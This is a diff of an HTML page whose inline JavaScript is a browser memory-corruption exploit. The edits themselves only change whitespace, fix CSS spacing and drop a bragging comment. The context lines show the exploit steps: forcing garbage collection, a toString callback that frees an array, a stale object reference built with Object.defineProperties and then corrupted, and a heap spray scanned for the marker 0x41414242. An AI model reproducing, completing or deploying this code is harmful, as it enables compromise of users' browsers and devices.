@@ -31,7 +31,7 @@
  position: fixed;
  position: relative;
  }
- h1{ 
+ h1 { 
  overflow: hidden;
  position: fixed;
  position: absolute;
@@ -53,7 +53,6 @@ footer {
 </head>
  <body>
 <script>
-
 //setting memory variables
  var mem0 = 0;
  var mem1 = 0;
@@ -120,12 +119,15 @@ footer {
 
  function go_() {
  	if (smsh.length != 0x10) return;
+    
  	dgc();
+    
  	var arr = new Array(0x100);
  	var yolo = new ArrayBuffer(0x1000);
+    
  	arr[0] = yolo;
- 	arr[1] = 0x13371337; //we got some 1337 h@\/ here bois
-	// 					  /\
+ 	arr[1] = 0x13371337;
+    
  	var not_number = {};
  	not_number.toString = function() {
  		arr = null;
@@ -168,14 +170,18 @@ footer {
 		
  		after: {value: 666}
  	};
+    
  	var target = [];
  	var stale = 0;
  	var before_len = arr.length;
+    
  	Object.defineProperties(target, props);
  	stale = target.stale;
  	stale[0] += 0x101;
  	stale[1] = {}
+    
  	for (var z = 0; z < 0x1000; z++) fc();
+    
  	for (i = 0; i < bufs.length; i++) {
  		for (k = 0; k < bufs[0].length; k++) {
  			if (bufs[i][k] == 0x41414242) {
@@ -204,7 +210,6 @@ footer {
  	}
  	document.location.reload();
  }
-
  </script>
 
 
